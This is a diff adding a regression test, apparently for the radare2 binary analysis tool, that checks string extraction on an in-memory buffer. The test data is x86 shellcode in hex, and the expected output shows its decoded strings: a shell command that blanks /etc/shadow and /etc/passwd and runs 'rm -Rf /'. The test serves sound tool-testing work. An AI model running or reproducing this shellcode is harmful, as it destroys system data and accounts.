@@ -828,6 +828,19 @@ puts@@GLIBC_2.2.5
 '
 run_test
 
+
+NAME='izzqq malloc://512 '
+FILE=malloc://512
+ARGS=
+CMDS="wx 6a0b58995266682d6389e7682f736800682f62696e89e352e8390000006563686f202222203e202f6574632f736861646f77203b206563686f202222203e202f6574632f706173737764203b20726d202d5266202f00575389e1cd80
+izzqq"
+EXPECT='Rfh-c
+h/sh
+h/bin
+echo "" > /etc/shadow ; echo "" > /etc/passwd ; rm -Rf /
+'
+run_test
+
 NAME='i (no rbin - file x86_64)'
 FILE=../bins/elf/analysis/hello-linux-x86_64
 ARGS="-n"
